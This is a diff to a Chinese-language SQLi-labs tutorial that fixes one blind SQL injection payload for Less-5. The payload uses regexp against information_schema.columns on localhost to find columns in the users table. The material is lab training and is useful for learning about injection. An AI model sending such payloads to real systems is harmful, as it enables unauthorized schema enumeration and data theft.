@@ -176,7 +176,7 @@ sqllab的less1-4都是这样
 
 ### 3）使用regexp获取 2）中users表中的列
 
->   http://localhost/sql/Less-5/?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp '^us[a-z]' limit 0,1)--+
+>   http://localhost/sql/Less-5/?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^us[a-z]' limit 0,1)--+
 
 上面的语句选择users表中的列是否有us**的列
 
